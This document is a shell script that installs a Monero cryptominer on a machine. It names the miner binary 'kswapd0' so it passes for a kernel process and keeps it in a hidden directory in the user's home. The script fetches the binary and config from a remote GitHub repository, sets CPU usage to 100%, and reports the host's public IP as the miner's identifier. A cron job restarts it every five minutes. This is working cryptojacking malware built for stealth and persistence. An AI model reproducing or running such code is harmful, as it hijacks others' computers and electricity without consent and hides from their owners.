#!/bin/sh

chattr -i $HOME/.gdm2_manual/*
chattr -i $HOME/.gdm2_manual/

# Script to start Monero Ocean Miner and manage files

# Create directory for the files
mkdir -p "$HOME/.gdm2_manual/"

# Paths to the required files
KSWAPD0="$HOME/.gdm2_manual/kswapd0-FreeBSD"
CONFIG_JSON="$HOME/.gdm2_manual/config.json"

# Terminate processes related to the specific kswapd0
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Check if the files exist and download if not
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 exists and is executable."
else
    echo "kswapd0 does not exist or is not executable. Downloading..."
    curl -L -o "$KSWAPD0" https://github.com/littlAcen/moneroocean-setup/raw/refs/heads/main/kswapd0-FreeBSD
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json exists."
else
    echo "config.json does not exist. Downloading..."
    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=`sh -c "(curl -4 ip.sb)"`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json


echo "sed"
#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2_manual/config.json
#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2_manual/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2_manual/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.gdm2_manual/config.json
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2_manual/config.json
sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2_manual/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2_manual/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2_manual/config.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2_manual/config.json

# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$KSWAPD0" --config="$CONFIG_JSON" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
#!/bin/bash

KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"

if ! pgrep -f "./kswapd0" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$HOME/.gdm2_manual/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Make the check script executable
chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"

# Cron job setup: remove outdated lines and add the new command
CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
